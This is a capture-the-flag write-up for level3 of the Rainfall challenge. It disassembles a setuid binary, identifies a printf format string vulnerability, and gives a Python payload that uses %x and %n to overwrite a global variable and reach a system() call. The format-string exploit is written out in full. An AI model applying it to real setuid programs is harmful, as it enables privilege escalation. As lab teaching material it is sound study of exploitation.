LEVEL 3

When logging as level3 in Rainfall we have a home with an executable called
level3 :

-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

We can execute it :

level3@RainFall:~$ ./level3
hello there
hello there

It waits for an input from stdin and print it.

Let's try with more arguments :

level3@RainFall:~$ ./level3 "hi" "hello" "123456789"
boom
boom

Nothing is changing, level2 is still waiting for stdin
We can try to send a file as parameter :

level3@RainFall:~$ echo "hello world" > /tmp/hello
level3@RainFall:~$ ./level3 < /tmp/hello
hello world

Opening the executable with gdb :

(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

We deduce and read online about print exploit.
It's called a format string exploit.

Basically it uses the format style of printf to print stack variable.

Giving as an argument %x, which prints in hexa with printf we can see stack 
variable next to printf :

level3@RainFall:~$ python -c 'print "%x " * 9' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 

To pass the condition at v + 59, eax must equal to 64

level3@RainFall:~$ objdump -t level3
....
0804988c g     O .bss	00000004              m
...

m is a global not set variable.

$(python -c 'print "A" * 12 + "\x8c\x98\x04\x08" + "%x " * 5 + "%x" + "%n"';cat)
| ./level3


